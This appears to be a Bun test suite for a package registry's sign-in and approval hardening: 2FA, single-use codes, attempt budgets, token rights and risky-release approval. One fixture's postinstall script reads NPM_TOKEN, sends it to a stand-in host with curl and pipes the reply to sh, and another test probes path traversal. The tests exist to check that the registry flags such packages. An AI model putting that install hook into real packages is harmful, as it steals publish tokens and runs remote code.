// Spec: sign-in and approval hardening (independent review, round 2).
// - Better Auth serves only the routes the website uses. The TOTP secret is never readable after setup.
//   Turning 2FA off, adding a passkey or linking another sign-in needs the existing factor or a recovery code.
// - A second-factor check proves one thing in one place: a website approval covers that request only, and a
//   website confirmation for the CLI covers one named command, once. Codes are exactly six digits.
// - Login tokens stage versions and cannot change live state (dist-tags, deprecate, yank, unyank) without a code.
// - Wrong codes share one persistent budget across every TOTP check, concurrent guesses included.
// - An accepted code is used once: not for a second approval, not after it turned 2FA on.
// - A GitHub rename keeps the scope (bound to GitHub's numeric id) and refreshes the login shown.
// - Incident response only revokes versions of packages the account still owns.
// - Legacy password auth on a public https registry refuses to start unless explicitly allowed.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  ROOT,
  startRegistry,
  startFakeGitHub,
  signInWithGitHub,
  enableTotp,
  enableTotpWithCodes,
  deviceLogin,
  addUser,
  totp,
  wrongTotp,
  approvalId,
  makeSandbox,
  writePackage,
  run,
  getJson,
  encodePkg,
  dig,
  type Registry,
  type FakeGitHub,
  type Browser,
} from "./harness";

let clock = Date.parse("2026-04-01T00:00:00Z");
let gh: FakeGitHub;
let npmFake: ReturnType<typeof Bun.serve>;
let reg: Registry;
let work: string;

function startFakeNpm(): ReturnType<typeof Bun.serve> {
  return Bun.serve({
    port: 0,
    hostname: "127.0.0.1",
    fetch(req) {
      const p = new URL(req.url).pathname;

      if (p.startsWith("/-/org/")) return Response.json({ error: "Scope not found" }, { status: 404 });

      if (p === "/-/v1/search") return Response.json({ objects: [], total: 0, time: new Date().toUTCString() });

      return Response.json({ error: "Not found" }, { status: 404 });
    },
  });
}

async function publishWith(r: Registry, name: string, version: string, token: string): Promise<{ code: number; out: string }> {
  const sb = makeSandbox(r, token);
  const dir = writePackage(work, { name, version }, r, token);
  const res = await run(["bun", "publish"], { cwd: dir, env: sb.env });

  return { code: res.code, out: res.out };
}

async function publishLive(name: string, version: string, token: string, r: Registry = reg): Promise<void> {
  const res = await publishWith(r, name, version, token);

  if (res.code !== 0) throw new Error(`publish ${name}@${version} failed: ${res.out}`);

  if (approvalId(res.out) !== null) throw new Error(`publish ${name}@${version} was staged, not live`);
}

async function stage(name: string, version: string, token: string): Promise<string> {
  const res = await publishWith(reg, name, version, token);
  expect(res.code, res.out).toBe(0);
  const id = approvalId(res.out);

  if (id === null) throw new Error(`no approval link for ${name}@${version}:\n${res.out}`);

  return id;
}

type Json = string | number | boolean | null | Json[] | { [key: string]: Json };

function api(path: string, token: string | null, body: { [key: string]: Json }, r: Registry = reg): Promise<{ status: number; body: unknown }> {
  const headers = new Headers({ "content-type": "application/json" });

  if (token) headers.set("authorization", `Bearer ${token}`);

  return getJson(`${r.url}-/apm/v1/${path}`, { method: "POST", headers, body: JSON.stringify(body) });
}

async function packument(name: string): Promise<{ status: number; body: unknown }> {
  return getJson(`${reg.url}${encodePkg(name)}`);
}

/** A signed-in GitHub account with 2FA on, a login token (stages) and a minted token that publishes live. */
async function account(login: string): Promise<{ b: Browser; secret: string; stageToken: string; liveToken: string; scope: string }> {
  const b = await signInWithGitHub(reg, gh, login);
  const secret = await enableTotp(b);
  const { token, username } = await deviceLogin(b);

  return { b, secret, stageToken: token, liveToken: reg.mintToken({ user: username, scope: "publish" }), scope: username };
}

beforeAll(async () => {
  gh = startFakeGitHub();
  npmFake = startFakeNpm();
  reg = await startRegistry({ now: () => clock, legacyAuth: false, namePolicy: "scoped", github: gh, upstream: npmFake.url.toString() });
  work = mkdtempSync(join(tmpdir(), "apm-auth-hard-"));
});

afterAll(async () => {
  await reg?.stop();
  await gh?.stop();
  await npmFake?.stop(true);
});

describe("Better Auth routes", () => {
  test("the TOTP secret cannot be read back once 2FA is on", async () => {
    const b = await signInWithGitHub(reg, gh, "secret-reader");
    await enableTotp(b);
    const r = await b.json("api/auth/two-factor/get-totp-uri", { method: "POST", body: {} });
    expect(r.status).not.toBe(200);
    expect(JSON.stringify(r.body)).not.toContain("otpauth");
    expect(JSON.stringify(r.body)).not.toMatch(/secret=/);
  });

  test("auth routes the website does not use are not served", async () => {
    const b = await signInWithGitHub(reg, gh, "route-prober");

    const probes: { method: string; path: string; body?: unknown }[] = [
      { method: "GET", path: "list-sessions" },
      { method: "GET", path: "list-accounts" },
      { method: "POST", path: "update-user", body: { name: "someone else" } },
      { method: "POST", path: "unlink-account", body: { providerId: "github" } },
      { method: "POST", path: "revoke-sessions", body: {} },
      { method: "POST", path: "two-factor/generate-backup-codes", body: {} },
      { method: "POST", path: "two-factor/verify-backup-code", body: { code: "xxxxx-xxxxx" } },
      { method: "GET", path: "passkey/list-user-passkeys" },
      { method: "POST", path: "passkey/delete-passkey", body: { id: "x" } },
      { method: "POST", path: "device/token", body: { grant_type: "urn:ietf:params:oauth:grant-type:device_code", device_code: "x", client_id: "apm-cli" } },
      { method: "POST", path: "sign-up/email", body: { email: "a@b.test", password: "long-enough-password", name: "a" } },
    ];

    for (const p of probes) {
      const r = await b.json(`api/auth/${p.path}`, { method: p.method, body: p.body });
      expect(r.status, `${p.method} ${p.path}: ${JSON.stringify(r.body)}`).toBe(404);
    }

    // the routes the website does use still answer
    expect((await b.json("api/auth/get-session")).status).toBe(200);
  });

  test("turning 2FA off needs the current code or a recovery code, and a recovery code works once", async () => {
    const b = await signInWithGitHub(reg, gh, "factor-keeper");
    const { secret, recoveryCodes } = await enableTotpWithCodes(b);
    expect(recoveryCodes.length).toBeGreaterThanOrEqual(8);
    const totpOn = async (): Promise<boolean> => dig((await b.json("-/apm/v1/account")).body, "security", "totp") === true;

    const bare = await b.json("api/auth/two-factor/disable", { method: "POST", body: {} });
    expect(bare.status, JSON.stringify(bare.body)).toBe(403);
    expect(await totpOn()).toBe(true);
    const wrong = await b.json("api/auth/two-factor/disable", { method: "POST", body: {}, headers: { "x-apm-second-factor": `totp:${wrongTotp(secret)}` } });
    expect(wrong.status).not.toBe(200);
    expect(await totpOn()).toBe(true);

    // a recovery code proves the factor once
    const code = recoveryCodes[0] ?? "";

    const first = await b.json("api/auth/link-social", {
      method: "POST",
      body: { provider: "github", callbackURL: "/account", disableRedirect: true },
      headers: { "x-apm-second-factor": `recovery:${code}` },
    });

    expect(first.status, JSON.stringify(first.body)).toBe(200);
    const again = await b.json("api/auth/two-factor/disable", { method: "POST", body: {}, headers: { "x-apm-second-factor": `recovery:${code}` } });
    expect(again.status).not.toBe(200);
    expect(await totpOn()).toBe(true);

    const off = await b.json("api/auth/two-factor/disable", { method: "POST", body: {}, headers: { "x-apm-second-factor": `recovery:${recoveryCodes[1] ?? ""}` } });
    expect(off.status, JSON.stringify(off.body)).toBe(200);
    expect(await totpOn()).toBe(false);
  });

  test("adding a passkey or linking another sign-in to an account with 2FA needs the existing factor", async () => {
    const b = await signInWithGitHub(reg, gh, "passkey-adder");
    const secret = await enableTotp(b);

    const register = (headers: Record<string, string> = {}) =>
      b.json("api/auth/passkey/verify-registration", { method: "POST", body: { response: { id: "x", rawId: "x", type: "public-key", response: {} } }, headers });

    const bare = await register();
    expect(bare.status, JSON.stringify(bare.body)).toBe(403);
    const link = await b.json("api/auth/link-social", { method: "POST", body: { provider: "github", callbackURL: "/account", disableRedirect: true } });
    expect(link.status, JSON.stringify(link.body)).toBe(403);
    // with the current code the request reaches Better Auth, which then checks the (fake) WebAuthn response
    const withCode = await register({ "x-apm-second-factor": `totp:${totp(secret)}` });
    expect(withCode.status, JSON.stringify(withCode.body)).not.toBe(403);
    expect(withCode.status).not.toBe(200);
  });
});

describe("a check proves one action in one session", () => {
  test("a website check in one session lets neither another session nor the CLI act; a CLI confirmation covers one named command once", async () => {
    const a = await account("two-tabs");
    await publishLive("@two-tabs/lib", "1.0.0", a.liveToken);
    await publishLive("@two-tabs/lib", "1.0.1", a.liveToken);
    const id = await stage("@two-tabs/staged", "1.0.0", a.stageToken);
    const other = await signInWithGitHub(reg, gh, "two-tabs");

    const check = await a.b.json("-/apm/v1/verify", {
      method: "POST",
      body: { code: totp(a.secret), command: { kind: "revoke", name: "@two-tabs/lib", version: "1.0.0" } },
    });

    expect(check.status, JSON.stringify(check.body)).toBe(200);

    // the other session approves nothing without its own check, and neither does the first
    expect((await other.json(`-/apm/v1/staged/${id}/approve`, { method: "POST", body: {} })).status).toBe(401);
    expect((await a.b.json(`-/apm/v1/staged/${id}/approve`, { method: "POST", body: {} })).status).toBe(401);
    expect((await packument("@two-tabs/staged")).status).toBe(404);

    // the CLI may run the named command, once, and nothing else
    expect((await api("revoke", a.stageToken, { name: "@two-tabs/lib", version: "1.0.1", reason: "not named" })).status).toBe(401);
    const named = await api("revoke", a.stageToken, { name: "@two-tabs/lib", version: "1.0.0", reason: "named" });
    expect(named.status, JSON.stringify(named.body)).toBe(200);
    expect((await api("restore", a.stageToken, { name: "@two-tabs/lib", version: "1.0.0" })).status).toBe(401);
    expect((await api("incident", a.stageToken, { since: new Date(clock - 60_000).toISOString(), dryRun: true })).status).toBe(401);
  });

  test("the CLI confirmation expires after 10 minutes", async () => {
    const a = await account("slow-confirm");
    await publishLive("@slow-confirm/lib", "1.0.0", a.liveToken);

    const check = await a.b.json("-/apm/v1/verify", {
      method: "POST",
      body: { code: totp(a.secret), command: { kind: "yank", name: "@slow-confirm/lib", version: "1.0.0" } },
    });

    expect(check.status, JSON.stringify(check.body)).toBe(200);
    clock += 11 * 60_000;
    expect((await api("yank", a.stageToken, { name: "@slow-confirm/lib", version: "1.0.0" })).status).toBe(401);
  });

  test("a blank or malformed code never counts as a check", async () => {
    const a = await account("blank-code");
    await publishLive("@blank-code/lib", "1.0.0", a.liveToken);
    const command = { kind: "revoke", name: "@blank-code/lib", version: "1.0.0" };
    const ok = await a.b.json("-/apm/v1/verify", { method: "POST", body: { code: totp(a.secret), command } });
    expect(ok.status, JSON.stringify(ok.body)).toBe(200);

    for (const code of [" ", "", "12345", "1234567", "12 3456", "abcdef", "１２３４５６"]) {
      const r = await a.b.json("-/apm/v1/verify", { method: "POST", body: { code, command } });
      expect(r.status, `code ${JSON.stringify(code)}: ${JSON.stringify(r.body)}`).toBe(400);
    }

    const id = await stage("@blank-code/staged", "1.0.0", a.stageToken);
    const blank = await a.b.json(`-/apm/v1/staged/${id}/approve`, { method: "POST", body: { code: " " } });
    expect(blank.status).toBe(400);
    expect((await packument("@blank-code/staged")).status).toBe(404);
    // the CLI otp is held to the same rule
    expect((await api("revoke", a.stageToken, { name: "@blank-code/lib", version: "1.0.0", reason: "x", otp: " 1 " })).status).toBe(400);
  });
});

describe("token capabilities", () => {
  test("a staging token cannot move dist-tags, deprecate, yank or unyank without a code", async () => {
    const a = await account("tag-mover");
    const name = "@tag-mover/lib";
    await publishLive(name, "1.0.0", a.liveToken);
    await publishLive(name, "1.1.0", a.liveToken);
    const latest = async (): Promise<string> => String(dig((await packument(name)).body, "dist-tags", "latest"));

    const setTag = (token: string, version: string, otp?: string) => {
      const headers = new Headers({ "content-type": "application/json", authorization: `Bearer ${token}` });

      if (otp) headers.set("npm-otp", otp);

      return getJson(`${reg.url}-/package/${encodePkg(name)}/dist-tags/latest`, { method: "PUT", headers, body: JSON.stringify(version) });
    };

    const deprecate = (token: string) =>
      getJson(`${reg.url}${encodePkg(name)}`, {
        method: "PUT",
        headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
        body: JSON.stringify({ name, versions: { "1.1.0": { name, version: "1.1.0", deprecated: "do not use" } } }),
      });

    const tag = await setTag(a.stageToken, "1.0.0");
    expect(tag.status, JSON.stringify(tag.body)).toBe(401);
    expect(await latest()).toBe("1.1.0");
    expect((await deprecate(a.stageToken)).status).toBe(401);
    expect(dig((await packument(name)).body, "versions", "1.1.0", "deprecated")).toBeUndefined();
    expect((await api("yank", a.stageToken, { name, version: "1.1.0", reason: "x" })).status).toBe(401);
    expect(await latest()).toBe("1.1.0");
    expect((await api("yank", a.liveToken, { name, version: "1.0.0", reason: "x" })).status).toBe(200);
    expect((await api("unyank", a.stageToken, { name, version: "1.0.0" })).status).toBe(401);

    // with a code the staging token may act; a live token keeps its direct rights
    expect((await api("unyank", a.stageToken, { name, version: "1.0.0", otp: totp(a.secret) })).status).toBe(200);
    const withOtp = await setTag(a.stageToken, "1.0.0", totp(a.secret));
    expect(withOtp.status, JSON.stringify(withOtp.body)).toBe(200);
    expect(await latest()).toBe("1.0.0");
    expect((await setTag(a.liveToken, "1.1.0")).status).toBe(200);
    expect(await latest()).toBe("1.1.0");
  });
});

describe("TOTP attempt budget", () => {
  test("concurrent wrong codes cannot get past the attempt budget, which every TOTP check shares", async () => {
    const a = await account("guesser");

    const tries = await Promise.all(
      Array.from({ length: 20 }, () => api("revoke", a.stageToken, { name: "@guesser/none", version: "1.0.0", reason: "x", otp: wrongTotp(a.secret) })),
    );

    const statuses = tries.map((t) => t.status);
    expect(statuses.filter((s) => s === 401).length, statuses.join(",")).toBeLessThanOrEqual(5);
    expect(statuses.filter((s) => s === 429).length, statuses.join(",")).toBeGreaterThanOrEqual(15);
    // the website shares the budget: even a valid code is refused while locked
    const web = await a.b.json("-/apm/v1/verify", { method: "POST", body: { code: totp(a.secret), command: { kind: "incident" } } });
    expect(web.status).toBe(429);
  });
});

describe("codes are single use", () => {
  test("an accepted code cannot approve a second release, act in the CLI, or be reused after turning 2FA on", async () => {
    const b = await signInWithGitHub(reg, gh, "one-code");
    const en = await b.json("api/auth/two-factor/enable", { method: "POST", body: {} });
    const secret = new URL(String(dig(en.body, "totpURI"))).searchParams.get("secret") ?? "";
    const enrollCode = totp(secret);
    expect((await b.json("api/auth/two-factor/verify-totp", { method: "POST", body: { code: enrollCode } })).status).toBe(200);
    const { token } = await deviceLogin(b);
    const id1 = await stage("@one-code/a", "1.0.0", token);
    const id2 = await stage("@one-code/b", "1.0.0", token);

    const afterEnroll = await b.json(`-/apm/v1/staged/${id1}/approve`, { method: "POST", body: { code: enrollCode } });
    expect(afterEnroll.status, JSON.stringify(afterEnroll.body)).toBe(401);
    expect((await packument("@one-code/a")).status).toBe(404);

    const code = totp(secret);
    const first = await b.json(`-/apm/v1/staged/${id1}/approve`, { method: "POST", body: { code } });
    expect(first.status, JSON.stringify(first.body)).toBe(200);
    const second = await b.json(`-/apm/v1/staged/${id2}/approve`, { method: "POST", body: { code } });
    expect(second.status, JSON.stringify(second.body)).toBe(401);
    expect((await packument("@one-code/b")).status).toBe(404);
    expect((await api("revoke", token, { name: "@one-code/a", version: "1.0.0", reason: "x", otp: code })).status).toBe(401);

    const fresh = await b.json(`-/apm/v1/staged/${id2}/approve`, { method: "POST", body: { code: totp(secret) } });
    expect(fresh.status, JSON.stringify(fresh.body)).toBe(200);
  });
});

describe("GitHub renames", () => {
  test("a renamed GitHub account keeps its scope and shows its new login; the old login does not free the scope", async () => {
    const before = await signInWithGitHub(reg, gh, "Old-Login");
    expect(dig((await before.json("-/apm/v1/account")).body, "scope")).toBe("old-login");

    gh.rename("Old-Login", "New-Login");
    const renamed = await signInWithGitHub(reg, gh, "New-Login");
    const me = await renamed.json("-/apm/v1/account");
    expect(dig(me.body, "scope")).toBe("old-login");
    expect(dig(me.body, "github")).toBe("New-Login");
    expect(dig(me.body, "githubRenamed")).toBe(true);

    // someone who takes the old login on GitHub gets no scope and is pointed at a name dispute
    const taker = await signInWithGitHub(reg, gh, "Old-Login");
    const theirs = await taker.json("-/apm/v1/account");
    expect(dig(theirs.body, "scope")).toBeNull();
    expect(dig(theirs.body, "scopeTaken")).toBe("old-login");
  });
});

describe("incident", () => {
  test("incident only revokes versions of packages the account still owns", async () => {
    let clock2 = Date.parse("2026-04-01T00:00:00Z");
    const legacy = await startRegistry({ now: () => clock2, legacyAuth: true, namePolicy: "open" });

    try {
      const PASSWORD = "correct-horse-battery";
      const alice = await addUser(legacy, "inc-alice", PASSWORD);
      await addUser(legacy, "inc-bob", PASSWORD);
      const t0 = clock2 - 60_000;
      await publishLive("inc-shared", "1.0.0", alice, legacy);
      await publishLive("inc-mine", "1.0.0", alice, legacy);
      clock2 += 60_000;
      expect((await api("owners", alice, { name: "inc-shared", user: "inc-bob", password: PASSWORD }, legacy)).status).toBe(200);
      const bobToken = await addUser(legacy, "inc-bob", PASSWORD);

      const removed = await getJson(`${legacy.url}-/apm/v1/owners`, {
        method: "DELETE",
        headers: { "content-type": "application/json", authorization: `Bearer ${bobToken}` },
        body: JSON.stringify({ name: "inc-shared", user: "inc-alice", password: PASSWORD }),
      });

      expect(removed.status, JSON.stringify(removed.body)).toBe(200);

      const preview = await api("incident", alice, { since: new Date(t0).toISOString(), reason: "phished", password: PASSWORD, dryRun: true }, legacy);
      expect(preview.status, JSON.stringify(preview.body)).toBe(200);
      expect(dig(preview.body, "revoked")).toEqual(["inc-mine@1.0.0"]);
      const done = await api("incident", alice, { since: new Date(t0).toISOString(), reason: "phished", password: PASSWORD }, legacy);
      expect(done.status, JSON.stringify(done.body)).toBe(200);
      expect(dig(done.body, "revoked")).toEqual(["inc-mine@1.0.0"]);
      const shared = await getJson(`${legacy.url}inc-shared`);
      expect(dig(shared.body, "dist-tags", "latest")).toBe("1.0.0");
    } finally {
      await legacy.stop();
    }
  });
});

describe("startup", () => {
  async function boot(env: Record<string, string>): Promise<{ exited: boolean; code: number | null; out: string }> {
    const dataDir = mkdtempSync(join(tmpdir(), "apm-boot-"));

    const proc = Bun.spawn(["bun", join(ROOT, "packages", "registry", "src", "main.ts")], {
      env: { PATH: process.env.PATH ?? "", HOME: dataDir, APM_PORT: "0", APM_DATA_DIR: dataDir, APM_UPSTREAM: "off", ...env },
      stdout: "pipe",
      stderr: "pipe",
    });

    let printed = "";
    const reader = proc.stdout.getReader();

    const started = (async (): Promise<boolean> => {
      for (;;) {
        const chunk = await reader.read();

        if (chunk.done) return false;
        printed += new TextDecoder().decode(chunk.value);

        if (printed.includes("listening")) return true;
      }
    })();

    const listening = await Promise.race([started, Bun.sleep(15_000).then(() => false)]);

    if (listening) proc.kill();
    else await Promise.race([proc.exited, Bun.sleep(5_000)]);
    const exited = !listening && proc.exitCode !== null;

    if (proc.exitCode === null) proc.kill();
    await proc.exited;
    const err = await new Response(proc.stderr).text();

    return { exited, code: proc.exitCode, out: printed + err };
  }

  test("legacy password auth on a public https URL refuses to start unless explicitly allowed", async () => {
    const refused = await boot({ APM_LEGACY_AUTH: "1", APM_PUBLIC_URL: "https://apmjs.dev/" });
    expect(refused.exited, refused.out).toBe(true);
    expect(refused.code).not.toBe(0);
    expect(refused.out).toContain("APM_ALLOW_LEGACY_IN_PROD");

    const allowed = await boot({ APM_LEGACY_AUTH: "1", APM_PUBLIC_URL: "https://apmjs.dev/", APM_ALLOW_LEGACY_IN_PROD: "1" });
    expect(allowed.out).toContain("listening");
    const local = await boot({ APM_LEGACY_AUTH: "1", APM_PUBLIC_URL: "http://localhost:3000/" });
    expect(local.out).toContain("listening");
    const off = await boot({ APM_PUBLIC_URL: "https://apmjs.dev/" });
    expect(off.out).toContain("listening");
  });
});

describe("approval page data", () => {
  test("a staged version shows its tarball sha512 and each file's contents, read-only", async () => {
    const a = await account("file-viewer");
    const id = await stage("@file-viewer/lib", "1.0.0", a.stageToken);
    const detail = await a.b.json(`-/apm/v1/staged/${id}`);
    expect(String(dig(detail.body, "integrity"))).toMatch(/^sha512-/);
    const file = await a.b.json(`-/apm/v1/staged/${id}/file?path=${encodeURIComponent("package.json")}`);
    expect(file.status, JSON.stringify(file.body)).toBe(200);
    expect(String(dig(file.body, "text"))).toContain("@file-viewer/lib");
    expect((await a.b.json(`-/apm/v1/staged/${id}/file?path=${encodeURIComponent("../../registry.sqlite")}`)).status).toBe(404);
    expect((await a.b.json(`-/apm/v1/staged/${id}/file?path=index.js`, { method: "POST", body: {} })).status).toBe(405);
    const stranger = await signInWithGitHub(reg, gh, "file-snoop");
    expect((await stranger.json(`-/apm/v1/staged/${id}/file?path=index.js`)).status).toBe(403);
  });

  test("a version scoring under the floor needs its package name typed to approve, enforced by the registry", async () => {
    const a = await account("risky-approver");
    const name = "@risky-approver/helper";
    const sb = makeSandbox(reg, a.stageToken);

    const dir = writePackage(
      work,
      {
        name,
        version: "1.0.0",
        scripts: { postinstall: "node setup.js" },
        files: {
          "index.js": "module.exports = 1;\n",
          "setup.js": "const { execSync } = require('child_process');\nconst t = process.env.NPM_TOKEN;\nexecSync(`curl -s https://x.example.net/?t=${t} | sh`);\neval('1');\n",
        },
      },
      reg,
      a.stageToken,
    );

    const res = await run(["bun", "publish"], { cwd: dir, env: sb.env });
    const id = approvalId(res.out);
    expect(id, res.out).not.toBeNull();
    const detail = await a.b.json(`-/apm/v1/staged/${id}`);
    expect(dig(detail.body, "confirmation", "kind")).toBe("typed");
    const untyped = await a.b.json(`-/apm/v1/staged/${id}/approve`, { method: "POST", body: { code: totp(a.secret) } });
    expect(untyped.status, JSON.stringify(untyped.body)).toBe(400);
    expect(String(dig(untyped.body, "error"))).toContain(name);
    const wrongName = await a.b.json(`-/apm/v1/staged/${id}/approve`, { method: "POST", body: { code: totp(a.secret), confirmName: "@risky-approver/other" } });
    expect(wrongName.status).toBe(400);
    expect((await packument(name)).status).toBe(404);
    const typed = await a.b.json(`-/apm/v1/staged/${id}/approve`, { method: "POST", body: { code: totp(a.secret), confirmName: name } });
    expect(typed.status, JSON.stringify(typed.body)).toBe(200);
    expect(dig((await packument(name)).body, "dist-tags", "latest")).toBe("1.0.0");
  });
});
